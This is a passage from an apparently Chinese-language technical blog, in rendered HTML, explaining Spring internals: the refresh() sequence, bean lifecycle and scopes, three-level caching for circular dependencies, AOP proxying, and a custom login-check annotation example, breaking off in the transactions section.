     <span class=\"comment\">// 3. 这个就很重要了，这一步是把配置文件解析成一个个Bean，并且注册到BeanFactory中，注意这里只是注册进去，并没有初始化。先继续往下看，等会展开这个方法详细解读</span></span><br><span class=\"line\">        ConfigurableListableBeanFactory beanFactory=obtainFreshBeanFactory();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//4. 这个方法的作用是：设置 BeanFactory 的类加载器，添加几个 BeanPostProcessor，手动注册几个特殊的 bean，这里都是spring里面的特殊处理，然后继续往下看</span></span><br><span class=\"line\">        prepareBeanFactory(beanFactory);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 5. 方法是提供给子类的扩展点，到这里的时候，所有的 Bean 都加载、注册完成了，但是都还没有初始化，具体的子类可以在这步的时候添加一些特殊的 BeanFactoryPostProcessor 的实现类，来完成一些其他的操作。</span></span><br><span class=\"line\">            postProcessBeanFactory(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 6. 接下来是这个方法是调用 BeanFactoryPostProcessor 各个实现类的 postProcessBeanFactory(factory) 方法；</span></span><br><span class=\"line\">            invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 7. 然后这个方法注册 BeanPostProcessor 的实现类，和上面的BeanFactoryPostProcessor 是有区别的，这个方法调用的其实是PostProcessorRegistrationDelegate类的registerBeanPostProcessors方法；</span></span><br><span class=\"line\">            <span class=\"comment\">// 这个类里面有个内部类BeanPostProcessorChecker，BeanPostProcessorChecker里面有两个方法postProcessBeforeInitialization和postProcessAfterInitialization，这两个方法分别在 Bean 初始化之前和初始化之后得到执行。</span></span><br><span class=\"line\">            <span class=\"comment\">// 然后回到refresh()方法中继续往下看</span></span><br><span class=\"line\">            registerBeanPostProcessors(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 8. 方法是初始化当前 ApplicationContext 的 MessageSource，国际化处理，继续往下</span></span><br><span class=\"line\">            initMessageSource();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 9. 方法初始化当前 ApplicationContext 的事件广播器继续往下</span></span><br><span class=\"line\">            initApplicationEventMulticaster();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 10. 方法初始化一些特殊的 Bean（在初始化 singleton beans 之前）；继续往下</span></span><br><span class=\"line\">            onRefresh();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 11. 方法注册事件监听器，监听器需要实现 ApplicationListener 接口；继续往下</span></span><br><span class=\"line\">            registerListeners();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 12. 重点到了 初始化所有的 singleton beans（单例bean），懒加载（non-lazy-init）的除外，这个方法也是等会细说</span></span><br><span class=\"line\">            finishBeanFactoryInitialization(beanFactory);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// 13. 方法是最后一步，广播事件，ApplicationContext 初始化完成</span></span><br><span class=\"line\">            finishRefresh();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(BeansException ex)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(logger.isWarnEnabled())&#123;</span><br><span class=\"line\">                logger.warn(<span class=\"string\">&quot;Exception encountered during context initialization - &quot;</span>+<span class=\"string\">&quot;cancelling refresh attempt: &quot;</span>+ex);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class=\"line\">            <span class=\"comment\">// 销毁已经初始化的 singleton 的 Beans，以免有些 bean 会一直占用资源</span></span><br><span class=\"line\">            destroyBeans();</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// Reset &#x27;active&#x27; flag.</span></span><br><span class=\"line\">            cancelRefresh(ex);</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"comment\">// Propagate exception to caller.</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> ex;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// Reset common introspection caches in Spring&#x27;s core, since we</span></span><br><span class=\"line\">            <span class=\"comment\">// might not ever need metadata for singleton beans anymore...</span></span><br><span class=\"line\">            resetCommonCaches();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Spring-bean的生命周期\"><a href=\"#Spring-bean的生命周期\" class=\"headerlink\" title=\"Spring bean的生命周期\"></a>Spring bean的生命周期</h3><p>Spring Bean的生命周期分为四个阶段和多个扩展点。扩展点又可以分为影响多个Bean和影响单个Bean。整理如下：</p>\n<p>四个阶段</p>\n<ul>\n<li>实例化 Instantiation</li>\n<li>属性赋值 Populate</li>\n<li>初始化 Initialization</li>\n<li>销毁 Destruction</li>\n</ul>\n<p>多个扩展点</p>\n<ul>\n<li>影响多个Bean<ul>\n<li>BeanPostProcessor(作用于初始化阶段的前后)</li>\n<li>InstantiationAwareBeanPostProcessor(作用于实例化阶段的前后)</li>\n</ul>\n</li>\n<li>影响单个Bean<ul>\n<li>Aware(Aware类型的接口的作用就是让我们能够拿到Spring容器中的一些资源)<ul>\n<li>Aware Group1<ul>\n<li>BeanNameAware</li>\n<li>BeanClassLoaderAware</li>\n<li>BeanFactoryAware</li>\n</ul>\n</li>\n<li>Aware Group2<ul>\n<li>EnvironmentAware</li>\n<li>EmbeddedValueResolverAware(实现该接口能够获取Spring EL解析器，用户的自定义注解需要支持spel表达式的时候可以使用)</li>\n<li>ApplicationContextAware(ResourceLoaderAware\\ApplicationEventPublisherAware\\MessageSourceAware)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>生命周期(实例化和属性赋值都是Spring帮助我们做的，能够自己实现的有初始化和销毁两个生命周期阶段)<ul>\n<li>InitializingBean</li>\n<li>DisposableBean</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"bean的作用域\"><a href=\"#bean的作用域\" class=\"headerlink\" title=\"bean的作用域\"></a>bean的作用域</h3><p>Spring Bean 中所说的作用域，在配置文件中即是“scope”</p>\n<p>在面向对象程序设计中作用域一般指对象或变量之间的可见范围。</p>\n<p>而在Spring容器中是指其创建的Bean对象相对于其他Bean对象的请求可见范围。</p>\n<p>在Spring 容器当中，一共提供了5种作用域类型，在配置文件中，通过属性scope来设置bean的作用域范围</p>\n<h4 id=\"singleton\"><a href=\"#singleton\" class=\"headerlink\" title=\"singleton\"></a>singleton</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot;singleton&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>当Bean的作用域为singleton的时候,Spring容器中只会存在一个共享的Bean实例，所有对Bean的请求只要id与bean的定义相匹配，则只会返回bean的同一实例。单一实例会被存储在单例缓存中，为Spring的缺省作用域。</p>\n<h4 id=\"prototype\"><a href=\"#prototype\" class=\"headerlink\" title=\"prototype\"></a>prototype</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot; prototype &quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>每次对该Bean请求的时候，Spring IoC都会创建一个新的作用域。</p>\n<p>对于有状态的Bean应该使用prototype，对于无状态的Bean则使用singleton</p>\n<h4 id=\"request\"><a href=\"#request\" class=\"headerlink\" title=\"request\"></a>request</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot; request &quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>Request作用域针对的是每次的Http请求，Spring容器会根据相关的Bean的</p>\n<p>定义来创建一个全新的Bean实例。而且该Bean只在当前request内是有效的。</p>\n<h4 id=\"session\"><a href=\"#session\" class=\"headerlink\" title=\"session\"></a>session</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot; session &quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>针对http session起作用，Spring容器会根据该Bean的定义来创建一个全新的Bean的实例。而且该Bean只在当前http session内是有效的。</p>\n<h4 id=\"global-session\"><a href=\"#global-session\" class=\"headerlink\" title=\"global session\"></a>global session</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userInfo&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;cn.lovepi.UserInfo&quot;</span> <span class=\"attr\">scope</span>=<span class=\"string\">&quot;globalSession&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>类似标准的http session作用域，不过仅仅在基于portlet的web应用当中才有意义。Portlet规范定义了全局的Session的概念。他被所有构成某个portlet外部应用中的各种不同的portlet所共享。在global<br>session作用域中所定义的bean被限定于全局的portlet session的生命周期范围之内。</p>\n<h3 id=\"循环依赖问题\"><a href=\"#循环依赖问题\" class=\"headerlink\" title=\"循环依赖问题\"></a>循环依赖问题</h3><h4 id=\"三级缓存\"><a href=\"#三级缓存\" class=\"headerlink\" title=\"三级缓存\"></a>三级缓存</h4><p>Spring 解决循环依赖的核心就是提前暴露对象，而提前暴露的对象就是放置于第二级缓存中。下表是三级缓存的说明：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>singletonObjects</td>\n<td>一级缓存，存放完整的 Bean。</td>\n</tr>\n<tr>\n<td>earlySingletonObjects</td>\n<td>二级缓存，存放提前暴露的Bean，Bean 是不完整的，未完成属性注入和执行 init 方法。</td>\n</tr>\n<tr>\n<td>singletonFactories</td>\n<td>三级缓存，存放的是 Bean 工厂，主要是生产 Bean，存放到二级缓存中。</td>\n</tr>\n</tbody></table>\n<p>所有被Spring 管理的 Bean，最终都会存放在 singletonObjects 中，这里面存放的 Bean 是经历了所有生命周期的（除了销毁的生命周期），完整的，可以给用户使用的。</p>\n<p>earlySingletonObjects 存放的是已经被实例化，但是还没有注入属性和执行 init 方法的 Bean。</p>\n<p>singletonFactories 存放的是生产 Bean 的工厂。</p>\n<p>Bean 都已经实例化了，为什么还需要一个生产 Bean 的工厂呢？这里实际上是跟 AOP 有关，如果项目中不需要为 Bean 进行代理，那么这个 Bean 工厂就会直接返回一开始实例化的对象，如果需要使用 AOP 进行代理，那么这个工厂就会发挥重要的作用了，这也是本文需要重点关注的问题之一。</p>\n<h4 id=\"解决循环依赖\"><a href=\"#解决循环依赖\" class=\"headerlink\" title=\"解决循环依赖\"></a>解决循环依赖</h4><p>Spring 是如何通过上面介绍的三级缓存来解决循环依赖的呢？这里只用 A，B 形成的循环依赖来举例：</p>\n<ol>\n<li>实例化 A，此时 A 还未完成属性填充和初始化方法（@PostConstruct）的执行，A 只是一个半成品。</li>\n<li>为 A 创建一个 Bean 工厂，并放入到  singletonFactories 中。</li>\n<li>发现 A 需要注入 B 对象，但是一级、二级、三级缓存均为发现对象 B。</li>\n<li>实例化 B，此时 B 还未完成属性填充和初始化方法（@PostConstruct）的执行，B 只是一个半成品。</li>\n<li>为 B 创建一个 Bean 工厂，并放入到  singletonFactories 中。</li>\n<li>发现 B 需要注入 A 对象，此时在一级、二级未发现对象 A，但是在三级缓存中发现了对象 A，从三级缓存中得到对象 A，并将对象 A 放入二级缓存中，同时删除三级缓存中的对象 A。（注意，此时的 A 还是一个半成品，并没有完成属性填充和执行初始化方法）</li>\n<li>将对象 A 注入到对象 B 中。</li>\n<li>对象 B 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 B。（此时对象 B 已经是一个成品）</li>\n<li>对象 A 得到对象 B，将对象 B 注入到对象 A 中。（对象 A 得到的是一个完整的对象 B）</li>\n<li>对象 A 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 A。</li>\n</ol>\n<h2 id=\"Spring框架中的单例bean是否线程安全\"><a href=\"#Spring框架中的单例bean是否线程安全\" class=\"headerlink\" title=\"Spring框架中的单例bean是否线程安全\"></a>Spring框架中的单例bean是否线程安全</h2><p>Spring框架中的单例bean是线程安全的吗？它是如何处理线程并发问题的?</p>\n<p>不是，Spring框架中的单例bean不是线程安全的。</p>\n<p>spring 中的 bean 默认是单例模式，spring 框架并没有对单例 bean 进行多线程的封装处理。实际上大部分 spring bean 是无状态的（比如 dao 类），在某种程度上来说 bean 也是安全的，但如果 bean<br>有状态的话（比如 view model ）就要开发者自己去保证线程安全了，最简单的就是改变 bean 的作用域，把“singleton”变更为“prototype”，这样请求 bean 相当于 new Bean()了， 保证线程安全了。</p>\n<ul>\n<li>有状态就是有数据存储功能。</li>\n<li>无状态就是不会保存数据。</li>\n</ul>\n<p>Spring如何处理线程并发问题?</p>\n<p>一般只有无状态的Bean才可以在多线程下共享，大部分是无状态的Bean。当存有状态的Bean的时候，spring一般是使用ThreadLocal进行处理，解决线程安全问题。</p>\n<p>ThreadLocal和线程同步机制都是为了解决多线程中相同变量的访问冲突问题。 同步机制采用了“时间换空间”的方式，仅提供一份变量，不同的线程获取锁，没获得锁的线程则需要排队。而ThreadLocal采用了“空间换时间”的方式。<br>ThreadLocal会为每一个线程提供一个独立的变量副本，从而隔离了多个线程对数据的访问冲突。因为每一个线程都拥有自己的变量副本，所以没有相同变量的访问冲突问题。所以在编写多线程代码时，可以把不安全的变量封装进ThreadLocal。</p>\n<h2 id=\"AOP\"><a href=\"#AOP\" class=\"headerlink\" title=\"AOP\"></a>AOP</h2><p>OOP(Object-Oriented Programming)面向对象编程，允许开发者定义纵向的关系，但并适用于定义横向的关系，导致了大量代码的重复，而不利于各个模块的重用。</p>\n<p>AOP(Aspect-Oriented Programming)<br>，一般称为面向切面编程，作为面向对象的一种补充，用于将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模块，这个模块被命名为“切面”（Aspect），减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。可用于权限认证、日志、事务处理等。</p>\n<h3 id=\"AOP原理\"><a href=\"#AOP原理\" class=\"headerlink\" title=\"AOP原理\"></a>AOP原理</h3><p>原理是在IOC过程中，创建bean实例时，最后都会对bean进行处理来实现增强，对于AOP来说就是创建代理类</p>\n<ul>\n<li>底层是动态代理技术<ul>\n<li>JDK动态代理(基于接口)</li>\n<li>CGLib动态代理(基于类)</li>\n<li>在Spring AOP中，如果使用的是单例，推荐使用CGLib代理</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"JDK动态代理\"><a href=\"#JDK动态代理\" class=\"headerlink\" title=\"JDK动态代理\"></a>JDK动态代理</h3><p>(一）实现原理</p>\n<p>JDK的动态代理是基于反射实现。JDK通过反射，生成一个代理类，这个代理类实现了原来那个类的全部接口，并对接口中定义的所有方法进行了代理。当我们通过代理对象执行原来那个类的方法时，代理类底层会通过反射机制，回调我们实现的InvocationHandler接口的invoke方法。并且这个代理类是Proxy类的子类（记住这个结论，后面测试要用）。这就是JDK动态代理大致的实现方式。</p>\n<p>（二）优点</p>\n<p>JDK动态代理是JDK原生的，不需要任何依赖即可使用；</p>\n<p>通过反射机制生成代理类的速度要比CGLib操作字节码生成代理类的速度更快；</p>\n<p>（三）缺点</p>\n<p>如果要使用JDK动态代理，被代理的类必须实现了接口，否则无法代理；</p>\n<p>JDK动态代理无法为没有在接口中定义的方法实现代理，假设我们有一个实现了接口的类，我们为它的一个不属于接口中的方法配置了切面，Spring仍然会使用JDK的动态代理，但是由于配置了切面的方法不属于接口，为这个方法配置的切面将不会被织入。</p>\n<p>JDK动态代理执行代理方法时，需要通过反射机制进行回调，此时方法执行的效率比较低；</p>\n<h3 id=\"CGLib动态代理\"><a href=\"#CGLib动态代理\" class=\"headerlink\" title=\"CGLib动态代理\"></a>CGLib动态代理</h3><p>（一）实现原理</p>\n<p>CGLib实现动态代理的原理是，底层采用了ASM字节码生成框架，直接对需要代理的类的字节码进行操作，生成这个类的一个子类，并重写了类的所有可以重写的方法，在重写的过程中，将我们定义的额外的逻辑（简单理解为Spring中的切面）织入到方法中，对方法进行了增强。而通过字节码操作生成的代理类，和我们自己编写并编译后的类没有太大区别。</p>\n<p>（二）优点</p>\n<p>使用CGLib代理的类，不需要实现接口，因为CGLib生成的代理类是直接继承自需要被代理的类；</p>\n<p>CGLib生成的代理类是原来那个类的子类，这就意味着这个代理类可以为原来那个类中，所有能够被子类重写的方法进行代理；</p>\n<p>CGLib生成的代理类，和我们自己编写并编译的类没有太大区别，对方法的调用和直接调用普通类的方式一致，所以CGLib执行代理方法的效率要高于JDK的动态代理；</p>\n<p>（三）缺点</p>\n<p>由于CGLib的代理类使用的是继承，这也就意味着如果需要被代理的类是一个final类，则无法使用CGLib代理；</p>\n<p>由于CGLib实现代理方法的方式是重写父类的方法，所以无法对final方法，或者private方法进行代理，因为子类无法重写这些方法；</p>\n<p>CGLib生成代理类的方式是通过操作字节码，这种方式生成代理类的速度要比JDK通过反射生成代理类的速度更慢；</p>\n<h3 id=\"AOP术语\"><a href=\"#AOP术语\" class=\"headerlink\" title=\"AOP术语\"></a>AOP术语</h3><h4 id=\"连接点-Join-point\"><a href=\"#连接点-Join-point\" class=\"headerlink\" title=\"连接点(Join point)\"></a>连接点(Join point)</h4><p>能够被拦截的地方</p>\n<h4 id=\"切点-Poincut\"><a href=\"#切点-Poincut\" class=\"headerlink\" title=\"切点(Poincut)\"></a>切点(Poincut)</h4><p>具体定位的连接点</p>\n<h4 id=\"增强-通知-Advice\"><a href=\"#增强-通知-Advice\" class=\"headerlink\" title=\"增强&#x2F;通知(Advice)\"></a>增强&#x2F;通知(Advice)</h4><p>表示添加到切点的一段逻辑代码，并定位连接点的方位信息</p>\n<h4 id=\"织入-Weaving\"><a href=\"#织入-Weaving\" class=\"headerlink\" title=\"织入(Weaving)\"></a>织入(Weaving)</h4><p>将增强&#x2F;通知添加到目标类的具体连接点上的过程。</p>\n<h4 id=\"引入-引介-Introduction\"><a href=\"#引入-引介-Introduction\" class=\"headerlink\" title=\"引入&#x2F;引介(Introduction)\"></a>引入&#x2F;引介(Introduction)</h4><p>允许我们向现有的类添加新方法或属性。是一种特殊的增强！</p>\n<h4 id=\"切面-Aspect\"><a href=\"#切面-Aspect\" class=\"headerlink\" title=\"切面(Aspect)\"></a>切面(Aspect)</h4><p>切面由切点和增强&#x2F;通知组成，它既包括了横切逻辑的定义、也包括了连接点的定义</p>\n<h3 id=\"Spring对AOP的支持\"><a href=\"#Spring对AOP的支持\" class=\"headerlink\" title=\"Spring对AOP的支持\"></a>Spring对AOP的支持</h3><ul>\n<li>基于代理的经典SpringAOP：需要实现接口，手动创建代理</li>\n<li>纯POJO切面：使用XML配置，aop命名空间</li>\n<li>@AspectJ注解驱动的切面：使用注解的方式，这是最简洁和最方便的！</li>\n</ul>\n<h2 id=\"怎么定义一个注解\"><a href=\"#怎么定义一个注解\" class=\"headerlink\" title=\"怎么定义一个注解\"></a>怎么定义一个注解</h2><h3 id=\"引入依赖\"><a href=\"#引入依赖\" class=\"headerlink\" title=\"引入依赖\"></a>引入依赖</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-aop<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"定义注解\"><a href=\"#定义注解\" class=\"headerlink\" title=\"定义注解\"></a>定义注解</h3><h4 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h4><p>java.lang.annotation 提供了四种元注解，专门注解其他的注解（在自定义注解的时候，需要使用到元注解）：</p>\n<ul>\n<li>@Documented – 注解是否将包含在JavaDoc中</li>\n<li>@Retention – 什么时候使用该注解</li>\n<li>@Target – 注解用于什么地方</li>\n<li>@Inherited – 是否允许子类继承该注解</li>\n</ul>\n<h5 id=\"Retention\"><a href=\"#Retention\" class=\"headerlink\" title=\"@Retention\"></a>@Retention</h5><p>定义该注解的生命周期</p>\n<ul>\n<li>RetentionPolicy.SOURCE : 在编译阶段丢弃。这些注解在编译结束之后就不再有任何意义，所以它们不会写入字节码。@Override, @SuppressWarnings都属于这类注解。</li>\n<li>RetentionPolicy.CLASS : 在类加载的时候丢弃。在字节码文件的处理中有用。注解默认使用这种方式</li>\n<li>RetentionPolicy.RUNTIME : 始终不会丢弃，运行期也保留该注解，因此可以使用反射机制读取该注解的信息。我们自定义的注解通常使用这种方式。</li>\n</ul>\n<h5 id=\"Target\"><a href=\"#Target\" class=\"headerlink\" title=\"@Target\"></a>@Target</h5><p>表示该注解用于什么地方。默认值为任何元素，表示该注解用于什么地方。可用的ElementType 参数包括</p>\n<ul>\n<li>ElementType.CONSTRUCTOR: 用于描述构造器</li>\n<li>ElementType.FIELD: 成员变量、对象、属性（包括enum实例）</li>\n<li>ElementType.LOCAL_VARIABLE: 用于描述局部变量</li>\n<li>ElementType.METHOD: 用于描述方法</li>\n<li>ElementType.PACKAGE: 用于描述包</li>\n<li>ElementType.PARAMETER: 用于描述参数</li>\n<li>ElementType.TYPE: 用于描述类、接口(包括注解类型) 或enum声明</li>\n</ul>\n<h5 id=\"Documented\"><a href=\"#Documented\" class=\"headerlink\" title=\"@Documented\"></a>@Documented</h5><p>一个简单的Annotations 标记注解，表示是否将注解信息添加在java文档中。</p>\n<h5 id=\"Inherited\"><a href=\"#Inherited\" class=\"headerlink\" title=\"@Inherited\"></a>@Inherited</h5><p>定义该注释和子类的关系</p>\n<p>@Inherited 元注解是一个标记注解，@Inherited 阐述了某个被标注的类型是被继承的。如果一个使用了@Inherited 修饰的annotation 类型被用于一个class，则这个annotation 将被用于该class<br>的子类。</p>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><p>自定义一个检查是否登录的注解</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"meta\">@Documented</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> CheckLogin &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Aspect</span></span><br><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"meta\">@Slf4j</span></span><br><span class=\"line\"><span class=\"meta\">@Order(1)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CheckLoginAspect</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Before(&quot;execution(* *..controller..*(..))&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">before</span><span class=\"params\">(JoinPoint joinPoint)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">MethodSignature</span> <span class=\"variable\">signature</span> <span class=\"operator\">=</span> (MethodSignature) joinPoint.getSignature();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> signature.getMethod();</span><br><span class=\"line\">        <span class=\"type\">CheckLogin</span> <span class=\"variable\">annotation</span> <span class=\"operator\">=</span> method.getAnnotation(CheckLogin.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (annotation == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取类上注解</span></span><br><span class=\"line\">            annotation = joinPoint.getTarget().getClass().getAnnotation(CheckLogin.class);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (annotation != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取到请求的属性</span></span><br><span class=\"line\">            <span class=\"type\">ServletRequestAttributes</span> <span class=\"variable\">attributes</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                    (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class=\"line\">            <span class=\"comment\">//获取到请求对象</span></span><br><span class=\"line\">            <span class=\"type\">HttpServletRequest</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> attributes.getRequest();</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">ssoToken</span> <span class=\"operator\">=</span> HttpUtil.getSsoToken(request);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ssoToken != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">loginUserTokenKey</span> <span class=\"operator\">=</span> AuthRedisKeyUtil.getLoginUserTokenKey(ssoToken);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (redisTemplate.hasKey(loginUserTokenKey)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//通过</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LoginException</span>(<span class=\"string\">&quot;登录已过期&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalRequestException</span>(<span class=\"string\">&quot;非法请求&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AccountController</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@CheckLogin</span></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/query&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> JSONObject <span class=\"title function_\">queryRegulation</span><span class=\"params\">(Integer pageNum, Integer pageSize)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//....业务逻辑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h2><h3 id=\"Spring-支持两种方式的事务管理\"><a href=\"#Spring-支持两种方式的事务管理\" class=\"headerlink\" title=\"Spring 支持两种方式的事务管理\"></a>Spring 支持两种方式的事务管理</h3><h4 id=\"1、编程式事务管理\"><a href=\"#1、编程式事务管理\" class=\"headerlink\" title=\"1、编程式事务管理\"></a>1、编程式事务管理</h4><ul>\n<li>TransactionTemplate</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> TransactionTemplate transactionTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title 